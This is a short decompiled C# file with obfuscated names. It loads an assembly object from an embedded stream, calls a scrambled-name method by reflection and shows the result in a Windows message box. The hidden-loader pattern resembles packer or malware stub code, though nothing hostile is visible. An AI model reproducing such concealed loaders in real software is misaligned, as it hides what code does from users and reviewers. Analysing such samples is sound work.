using System;
using System.Reflection;
using System.Runtime.InteropServices;

internal sealed class Class0
{
	[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	private static extern int MessageBox(IntPtr intptr_0, string string_0, string string_1, uint uint_0);

	internal void method_0()
	{
		Stream0 stream = new Stream0();
		try
		{
			Type type = ((Assembly)stream.method_0()).GetType("Jhrwngeavwpxvtr.Ipopeleya");
			if (type.Name.Length > 1)
			{
				MessageBox(IntPtr.Zero, (string)type.InvokeMember("Svomjkgp", BindingFlags.InvokeMethod, null, null, null), string.Empty, 0u);
			}
		}
		finally
		{
			((IDisposable)stream).Dispose();
		}
	}
}
